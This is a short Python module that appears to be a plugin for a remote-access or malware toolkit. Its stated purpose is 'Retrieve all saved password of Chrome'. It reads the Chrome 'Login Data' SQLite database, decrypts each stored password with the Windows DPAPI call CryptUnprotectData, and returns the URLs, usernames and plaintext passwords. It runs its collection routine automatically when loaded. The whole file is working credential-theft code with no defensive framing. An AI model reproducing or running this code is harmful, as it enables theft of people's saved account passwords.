__sys__ = ["Darwin", "Linux", "Windows"];
__name__ = "chromePassword"
__desc__ = "Retrieve all saved password of Chrome"

def send():
    import os, sqlite3, win32crypt
    result = []
    try:
        path = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            vGen = cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            dataValue = vGen.fetchall()
        for originURL, username, password in dataValue:
            passwordDecrypted = win32crypt.CryptUnprotectData(
                password, None, None, None, 0)[1]
            if password:
                result.append({
                    'origin_url': originURL,
                    'username': username,
                    'password': str(passwordDecrypted)
                })
        return result
    except:
        return "Failed"
send()
